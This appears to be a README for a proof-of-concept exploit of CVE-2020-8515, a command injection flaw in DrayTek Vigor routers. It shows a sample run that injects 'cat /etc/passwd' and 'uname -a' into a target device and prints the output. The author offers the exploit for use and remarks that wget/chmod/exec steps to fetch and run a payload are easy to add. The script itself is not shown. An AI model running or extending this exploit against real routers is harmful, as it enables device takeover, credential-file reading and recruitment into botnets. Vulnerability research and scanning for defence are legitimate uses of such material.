# CVE-2020-8515
Draytek CVE-2020-8515 PoC I had kicking about. 

Amusingly, the command injected gets executed twice, see here:

```
$ ./draytek.py draytek.local
(>) executing command: cat /etc/passwd
(+) vulnerable!
(>) executing command: uname -a
Linux Vigor3900 2.6.33.5 #1 Wed Mar 28 00:49:28 CST 2018 armv6l unknown
Linux Vigor3900 2.6.33.5 #1 Wed Mar 28 00:49:28 CST 2018 armv6l unknown
```

I had some plans to polish this one off nicely, but honestly, its like what, a year later and I can't remember what those plans were, so here you go. It isn't hard to add some wget/chmod/exec stuff to this, just look in the "do_stuff" function.

This exploit won't cause much harm ITW, all the boxes vulnerable to this have probably been coopted by script kiddies DDoS botnets already.

For scanning: use [the nuclei template someone made](https://github.com/projectdiscovery/nuclei-templates/blob/d174cab04cf29c933585fbf325b44b04f4fa9cde/cves/2020/CVE-2020-8515.yaml)
